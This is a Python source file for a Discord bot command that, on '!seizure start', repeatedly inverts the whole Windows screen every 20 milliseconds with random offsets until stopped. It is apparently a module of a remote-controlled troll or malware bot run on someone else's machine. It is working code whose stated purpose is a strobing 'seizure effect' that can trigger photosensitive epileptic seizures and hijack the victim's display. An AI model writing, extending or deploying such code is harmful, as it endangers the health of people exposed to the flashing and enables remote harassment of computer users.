import win32gui
import ctypes
import time
import threading
import discord
import random

is_running = False
thread = None

def run_seizure_effect():
    global is_running
    hdc = win32gui.GetDC(0)
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
    
    while is_running:
        offset_x = random.randint(-10, 10)
        offset_y = random.randint(-10, 10)
        win32gui.InvertRect(hdc, (offset_x, offset_y, w + offset_x, h + offset_y))
        time.sleep(0.02)

async def seizure(ctx, action: str):
    global is_running, thread

    if action == "start":
        if is_running:
            await ctx.send("Seizure effect is already running!")
            return
        is_running = True
        thread = threading.Thread(target=run_seizure_effect)
        thread.start()
        await ctx.send("Seizure effect started! Type `!seizure stop` to stop it.")
    
    elif action == "stop":
        if not is_running:
            await ctx.send("Seizure effect is not running!")
            return
        is_running = False
        if thread is not None:
            thread.join()
        await ctx.send("Seizure effect stopped.")
    
    else:
        await ctx.send("Invalid action. Use `start` or `stop`.")
